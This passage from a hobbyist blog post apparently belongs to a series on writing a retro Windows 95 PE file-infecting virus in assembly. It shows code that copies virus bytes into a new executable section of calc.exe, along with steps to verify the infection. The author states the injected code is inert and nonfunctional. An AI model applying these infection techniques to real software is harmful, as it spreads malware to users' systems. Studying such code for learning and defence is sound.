+</span></span><span style=display:flex><span><span style=color:#75715e>; Save a handle to the new memory map</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [targetMapHandle], eax
+</span></span></code></pre></td></tr></table></div></div><p>After the enlarged view of the file is mapped it was just a matter of copying the generation 0 code that is currently executing from memory into the new section. For this I used a fun bit of self-referential code that relies on the <code>viral_payload</code> label and the new <code>SizeOfRawData</code> to know where to begin copying from and how many bytes to copy.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; inputs:   `injectStart`   -&gt; the start of the new virus section&#39;s raw data</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `injectSize`    -&gt; the size of the new virus section&#39;s raw data</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;           `eax`           -&gt; the `targetP` pointer to the start of the .exe </span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;                              memory map</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>; Time to write the new section content with our own code</span>
+</span></span><span style=display:flex><span>@@startcopyviruscode:
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Destination: the start of our section in targetP</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> edi, eax
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>add</span> edi, [injectStart]
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Source: the beginning of the virus code</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> esi, offset viral_payload
+</span></span><span style=display:flex><span>  <span style=color:#75715e>; Number of bytes to copy: size of the injected section</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> ecx, [injectSize]
+</span></span><span style=display:flex><span><span style=color:#75715e>; Copy the virus code into place</span>
+</span></span><span style=display:flex><span>@@copyviruscode:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>rep</span> movsb
+</span></span></code></pre></td></tr></table></div></div><h1 id=complete-assembly-code>Complete Assembly code <a href=#complete-assembly-code class=anchor>🔗</a></h1><p>The code that implements all of the above is available in the <a href=https://github.com/cpu/vexation target=_blank rel=noopener>VeXation Github
+repo</a> under <a href=https://github.com/cpu/vexation/tree/master/minijector target=_blank rel=noopener>the <code>minijector</code> folder</a>. &ldquo;Mini&rdquo; because it isn&rsquo;t a finished virus, &ldquo;jector&rdquo; because saying &ldquo;injector&rdquo; over and over was driving me batty.</p><p>Assuming you have <a href=../setup>the same dev environment set up</a> as I do you can build the project with <code>make</code> (or with debug symbols using <code>make -DDEBUG</code>). If you want to step through an infection process run <code>make run</code> which will copy a clean <code>calc.exe</code> into the project directory and then run <code>td32</code> on the <code>minijector.exe</code> binary to let you step through the infection process.</p><p>A few high level notes:</p><ul><li>The majority of the good stuff is in <a href=https://github.com/cpu/vexation/blob/master/minijector/minijector.asm target=_blank rel=noopener>minijector.asm</a>.</li><li>I used <code>.model flat, stdcall</code> at the start so that subsequent <code>call</code> instructions for Win32 APIs are handled correctly by default. Win32 uses the <code>stdcall</code> calling convention and it&rsquo;s a pain to <code>push</code> arguments onto the stack in reverse order manually.</li><li>I didn&rsquo;t use any of TASM&rsquo;s &ldquo;Ideal&rdquo; mode and the code <em>should</em> be MASM compatible.</li><li>My <a href=https://github.com/cpu/vexation/blob/master/minijector/windows.inc target=_blank rel=noopener><code>windows.inc</code> file</a> is a stripped down version of what comes with <a href=http://www.masm32.com/ target=_blank rel=noopener>the MASM32 SDK</a>. Using the unaltered MASM32 <code>windows.inc</code> results in build errors because it&rsquo;s SO BIG. I cut it down to only what <code>minijector</code> uses.</li><li>I chose to name the virus segment <code>ireloc</code>. That&rsquo;s because most PE binaries already have a <code>reloc</code> section and an <code>idata</code> section. <code>ireloc</code> sounds like it should belong, no? :-)</li><li>I tried to write defensive code. Lots of public virus source code skips checking error returns from API calls or assumes the DOS/PE headers aren&rsquo;t malicious/invalid and I hope paying attention to that stuff makes my extremely simple virus marginally less lame. That said, I&rsquo;m sure I messed something up and a malicious PE file could be crafted that will crash the infection routines (Send me a sample if you make one!)</li><li>I used a lot of locally scoped (<code>@@</code> prefixed) labels as something between a comment and a marker post for navigating the sourcecode. This is probably a &ldquo;quirk&rdquo; of my own style and not a great practice.</li><li>I&rsquo;m a pretty novice assembly programmer, so (kind) feedback is welcome!</li></ul><h1 id=verifying-the-work-so-far>Verifying the work so far <a href=#verifying-the-work-so-far class=anchor>🔗</a></h1><p>Whenever computers are involved I find it&rsquo;s helpful to verify my work in as many ways as possible. Since PE files exist both at-rest on disk and in-memory at-runtime I found it useful to verify both states of an infected <code>calc.exe</code> looked like I expected after running the <code>minijector.exe</code> generation 0 infector in the same directory.</p><p>Borland Turbo Assembler 5.0 comes with a handy program called <code>tdump</code> short for (hold your laughter) &ldquo;Turbo Dump&rdquo;. This command lets you easily see PE metadata for a given executable. I&rsquo;ve included the <code>tdump</code> output for a clean <code>calc.exe</code> <a href=https://github.com/cpu/vexation/blob/master/minijector/calc.clean.exe.tdump.txt target=_blank rel=noopener>here</a>, and the <code>tdump</code> of an infected <code>calc.exe</code> <a href=https://github.com/cpu/vexation/blob/master/minijector/calc.exe.tdump.txt target=_blank rel=noopener>here</a>.</p><p>There is one important difference in the output that I used to verify the work so far. The original <code>calc.exe</code> has the following sections in the object table:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Object table:
+</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags   
+</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
+</span></span><span style=display:flex><span>01  .text     000096B0  00001000  00009800  00000400  60000020 [CER]
+</span></span><span style=display:flex><span>02  .bss      0000094C  0000B000  00000000  00000000  C0000080 [URW]
+</span></span><span style=display:flex><span>03  .data     00001700  0000C000  00001800  00009C00  C0000040 [IRW]
+</span></span><span style=display:flex><span>04  .idata    00000B64  0000E000  00000C00  0000B400  40000040 [IR]
+</span></span><span style=display:flex><span>05  .rsrc     000015CC  0000F000  00001600  0000C000  40000040 [IR]
+</span></span><span style=display:flex><span>06  .reloc    00001040  00011000  00001200  0000D600  42000040 [IDR]
+</span></span></code></pre></div><p>The infected <code>calc.exe</code> has one more section (the virus section!) in addition to all of the above:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>07  .ireloc   00001000  00013000  00000400  0000E800  E0000020 [CERW]
+</span></span></code></pre></div><p>It was also reassuring at this point to see an RVA value (corresponding to the the <code>SecHdrVirtualAddress</code> field) that was higher than all of the previous section&rsquo;s RVA values, as well as a Physical Offset (corresponding to the <code>PointerToRawData</code> field) that was higher than all of the previous section&rsquo;s Physical Offset&rsquo;s. Also reassuring was seeing the two sizes of the new section both seemed properly aligned and matched my earlier padding calculations.</p><p>As mentioned before the new virus section is not subtle and its flags value (corresponding to the <code>SecHdrCharacteristics</code> field) make it even less so. I set the characteristics flag of the section to be read/write as well as executable in preparation for future work and a writable code section will likely tickle some AV heuristics.</p><p>To be extra sure things were working as expected I used the values from <code>tdump</code> as a map into a raw <code>hexdump -C</code> of both <a href=https://github.com/cpu/vexation/blob/master/minijector/calc.clean.exe target=_blank rel=noopener>the clean <code>calc.exe</code></a> and <a href=https://github.com/cpu/vexation/blob/master/minijector/calc.exe target=_blank rel=noopener>the infected <code>calc.exe</code></a>. I cheated here and ran <code>hexdump</code> from my Linux host because I really didn&rsquo;t want to find a hex dump utility for Windows 95. I included the hexdump output from a clean calc.exe <a href=https://github.com/cpu/vexation/blob/master/minijector/calc.clean.exe.hexdump.txt target=_blank rel=noopener>here</a> and from the infected calc.exe <a href=https://github.com/cpu/vexation/blob/master/minijector/calc.exe.hexdump.txt target=_blank rel=noopener>here</a>.</p><p>Looking at the <a href=https://github.com/cpu/vexation/blob/master/minijector/hexdump.diff.txt target=_blank rel=noopener>diff between the two hexdumps</a> showed what I was expecting. Early in the file there was a diff to the number of sections (a <code>06</code> changed to a <code>07</code>). There is also an addition of new section metadata including the <code>.ireloc</code> string bytes (<code>2E 69 72 65 6C 6F 63 00</code> == <code>".ireloc\0"</code>). Towards the end of the file was a big blob of new data that isn&rsquo;t present in the original file (the virus code!).</p><p>That confirmed things look good at-rest on disk, but what about at-runtime when the infected <code>calc.exe</code> is loaded into memory? To verify this I turned to the trusty Turbo Assembler debugger <code>td32</code>.</p><p>Running the infected <code>calc.exe</code> in <code>td32</code> initially generated a warning about there being no debug symbols (this is expected). After closing that I found myself at address <code>0x0040534E</code>. I was able to turn back to the <code>tdump</code> output to understand why that is. The PE was loaded at the base address <code>0x00400000</code> and <code>tdump</code> says the entry point RVA is <code>0x0000534E</code>. Add those two together and you get <code>0x0040534E</code>, the start address of the original <code>calc.exe</code> code and the location the debugger is paused.</p><p>Since I didn&rsquo;t change the entry point of <code>calc.exe</code> to point to the new segment and the virus code I had to go out of my way to find it in memory to look at the dissassembly. I found the easiest way to do that (while execution is still paused at the start of the <code>calc.exe</code> code) was to:</p><ol><li>right click the viewing area and choose &ldquo;Go To&rdquo;.</li><li>enter the expression <code>00400000 + 00013000</code></li></ol><p><p class=markdown-image><figure><a href=/posts/pe-infector-basics/td32.go.to.jpg><picture><source media="(max-width: 420px)" srcset=/posts/pe-infector-basics/td32.go.to_huad652aebf86f5151d33299188d971b2d_87279_400x0_resize_q75_h2_box.webp><source media="(max-width: 920px)" srcset=/posts/pe-infector-basics/td32.go.to_huad652aebf86f5151d33299188d971b2d_87279_600x0_resize_q75_h2_box.webp><source media="(max-width: 1400px)" srcset=/posts/pe-infector-basics/td32.go.to_huad652aebf86f5151d33299188d971b2d_87279_800x0_resize_q75_h2_box.webp><img alt="TD32 Goto Screenshot" title="TD32 Goto Screenshot" src=td32.go.to.jpg loading=lazy class=img-fluid></picture></a><figcaption>Enter the target expression.</figcaption></figure></p></p><p><p class=markdown-image><figure><a href=/posts/pe-infector-basics/td32.go.to.result.jpg><picture><source media="(max-width: 420px)" srcset=/posts/pe-infector-basics/td32.go.to.result_hua02b0de8ebf862c631618c37a071ec50_86205_400x0_resize_q75_h2_box.webp><source media="(max-width: 920px)" srcset=/posts/pe-infector-basics/td32.go.to.result_hua02b0de8ebf862c631618c37a071ec50_86205_600x0_resize_q75_h2_box.webp><source media="(max-width: 1400px)" srcset=/posts/pe-infector-basics/td32.go.to.result_hua02b0de8ebf862c631618c37a071ec50_86205_800x0_resize_q75_h2_box.webp><img alt="TD32 Dissassembly Screenshot" title="TD32 Dissassembly Screenshot" src=td32.go.to.result.jpg loading=lazy class=img-fluid></picture></a><figcaption>The disassembly at the target location should look familiar.</figcaption></figure></p></p><p>Why is <code>0x00013000</code> used in the expression? Back in the <code>tdump</code> output I saw that value is the RVA of the virus segment. Adding it to the base address the infected PE was loaded at (<code>0x00400000</code>) gives the start of the virus code in memory.</p><p>Looking at the disassembly that is now in view let me quickly see that the right code was injected. The most obvious &ldquo;tell&rdquo; for me is the comparison with <code>0xFFFFFFFF</code> done a few instructions after the start of the disassembly. That&rsquo;s
+the <code>cmp eax, INVALID_FILE_HANDLE_VALUE</code> instruction from <a href=https://github.com/cpu/vexation/blob/63dd691b18b26f56381b53878a2f1fa29bb047a7/minijector/minijector.asm#L61 target=_blank rel=noopener>line 61 of <code>minijector.asm</code></a>. Neat!</p><p>The combination of the <code>tdump</code> output, the <code>hexdump -C</code> output, and the state of the program at runtime in <code>td32</code> all gave me confidence that I&rsquo;m on the right track.</p><h1 id=conclusion>Conclusion <a href=#conclusion class=anchor>🔗</a></h1><p>Wow, that was a lot of work! Before getting too excited there&rsquo;s a few hard realities to face. First off, all of the code I injected is entirely inert. Since the entry point RVA wasn&rsquo;t changed it won&rsquo;t ever be run. There won&rsquo;t be a generation 2. Second, and more importantly, even if the code was run it wouldn&rsquo;t work! There&rsquo;s three important reasons why:</p><ol><li>It assumes it was loaded in the same location as generation 0/<code>minijector.exe</code>, not the new segment location in <code>calc.exe</code>!</li><li>It references locations that were part of a data segment that wasn&rsquo;t copied to the infected file!</li><li>It assumes the locations of all of the <code>kernel32.dll</code> win32 API addresses that are used won&rsquo;t change from where they were for generation 0!</li></ol><p>Why go through all the trouble of building a file infector that only infects once? Well, you have to start somewhere :-) This was the easiest way I could think to start out and it let me write a more &ldquo;vanilla&rdquo; program. The remaining problems help illustrate the unique requirements of virus code compared to normal program code. The solutions are quite interesting and unfortunately will have to wait until next time..</p><p>As always, I would love to hear feedback about this project. I&rsquo;m finding it somewhat challenging to decide on what level of detail to share and what knowledge to assume (e.g. about general assembly programming) so thoughts here are particularly welcome! Feel free to drop me a line on twitter (<a href=https://twitter.com/cpu target=_blank rel=noopener>@cpu</a>) or by email (<a href=mailto://daniel@binaryparadox.net>daniel@binaryparadox.net</a>).</p></div><nav class=bottom_nav><ul><li style=flex:1><a rel=prev href=https://log.vexation.ca/posts/setup/>← Getting set up</a></li><li style="flex:1 0 80px;text-align:center"><button onclick="document.body.scrollTop=0,document.documentElement.scrollTop=0,event.preventDefault()">
+↑ Back to top</button></li><li style=flex:1><a href=https://log.vexation.ca/posts/delta-offset/>Delta Offsets →</a></li></ul></nav></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/cpu/vexation rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a><a class=symbol href=https://twitter.com/cpu rel=me target=_blank><svg fill="#bbb" width="28" height="28" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="438.536" height="438.536" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536"><g><path d="M414.41 24.123C398.333 8.042 378.963.0 356.315.0H82.228C59.58.0 40.21 8.042 24.126 24.123 8.045 40.207.003 59.576.003 82.225v274.084c0 22.647 8.042 42.018 24.123 58.102 16.084 16.084 35.454 24.126 58.102 24.126h274.084c22.648.0 42.018-8.042 58.095-24.126 16.084-16.084 24.126-35.454 24.126-58.102V82.225C438.532 59.576 430.49 40.204 414.41 24.123zM335.471 168.735c.191 1.713.288 4.278.288 7.71.0 15.989-2.334 32.025-6.995 48.104-4.661 16.087-11.8 31.504-21.416 46.254-9.606 14.749-21.074 27.791-34.396 39.115-13.325 11.32-29.311 20.365-47.968 27.117-18.648 6.762-38.637 10.143-59.953 10.143-33.116.0-63.76-8.952-91.931-26.836 4.568.568 9.329.855 14.275.855 27.6.0 52.439-8.565 74.519-25.7-12.941-.185-24.506-4.179-34.688-11.991-10.185-7.803-17.273-17.699-21.271-29.691 4.947.76 8.658 1.137 11.132 1.137 4.187.0 9.042-.76 14.56-2.279-13.894-2.669-25.598-9.562-35.115-20.697-9.519-11.136-14.277-23.84-14.277-38.114v-.571c10.085 4.755 19.602 7.229 28.549 7.422-17.321-11.613-25.981-28.265-25.981-49.963.0-10.66 2.758-20.747 8.278-30.264 15.035 18.464 33.311 33.213 54.816 44.252 21.507 11.038 44.54 17.227 69.092 18.558-.95-3.616-1.427-8.186-1.427-13.704.0-16.562 5.853-30.692 17.56-42.399 11.703-11.706 25.837-17.561 42.394-17.561 17.515.0 32.079 6.283 43.688 18.846 13.134-2.474 25.892-7.33 38.26-14.56-4.757 14.652-13.613 25.788-26.55 33.402 12.368-1.716 23.88-4.95 34.537-9.708C357.458 149.793 347.462 160.166 335.471 168.735z"/></g></svg></a></div><div class=copyright>© Copyright
+2022
+<span class=split><a style=text-decoration:none;color:currentColor;cursor:not-allowed href=https://monkeypunch.biz>☠</a></span>
+Daniel McCarney</div></footer></body></html>
